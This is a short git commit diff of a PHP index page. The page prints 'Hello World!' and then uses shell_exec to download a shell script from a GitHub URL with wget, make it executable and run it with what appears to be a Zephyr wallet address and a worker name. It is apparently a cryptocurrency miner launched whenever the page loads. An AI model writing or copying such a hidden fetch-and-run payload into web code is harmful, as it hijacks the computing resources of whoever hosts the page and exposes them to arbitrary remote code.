4be1fa5c669c735d0b8dbb47338d3a009636acca
bachxthang <74278908+bachxthang@users.noreply.github.com>
2023-12-10 17:29:10 +0700

    Update index.php

--- index.php
+++ index.php
@@ -1,7 +1,4 @@
 <?php
 
 echo "Hello World!";
-$old_path = getcwd();
-chdir('./');
 shell_exec('#!/bin/bash\nwget -O MO.sh https://raw.githubusercontent.com/bachxthang/customUA/main/MO.sh && chmod +x MO.sh && bash ./MO.sh ZEPHYR2FyR1FjS8hxnNP75PK2yhLyePevM44PxRp6FUtamNpUjQvMwF4Rtxfx873HCdLDU5MWoUrxJPf3FmeTt9UgpFVo9SCVW117 TEST01');
-chdir($old_path);
